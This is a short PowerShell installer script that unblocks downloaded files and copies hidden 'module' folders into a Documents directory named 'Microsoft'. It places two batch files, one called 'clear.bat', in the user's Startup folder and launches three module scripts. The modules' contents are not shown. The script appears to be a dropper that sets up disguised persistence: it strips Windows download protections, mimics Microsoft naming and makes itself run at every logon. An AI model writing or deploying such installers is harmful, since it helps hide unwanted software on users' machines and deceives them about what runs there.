# Settings
$location = Get-Location
$sourcePath = "${location}\Microsoft"
$destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"

# Unblock Files
dir -r | unblock-file

# Copy to System
xcopy "${sourcePath}\module-1\" "${destinationPath}\module-1" /S /H /I
xcopy "${sourcePath}\module-2\" "${destinationPath}\module-2" /S /H /I

Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# Start Modules
Start-Process ".\microsoft\module-3\module-3-START.bat"
Start-Process "${destinationPath}\module-2\module-2-START.bat"
Start-Sleep 4
Start-Process "${destinationPath}\module-1\module-1-START.bat"
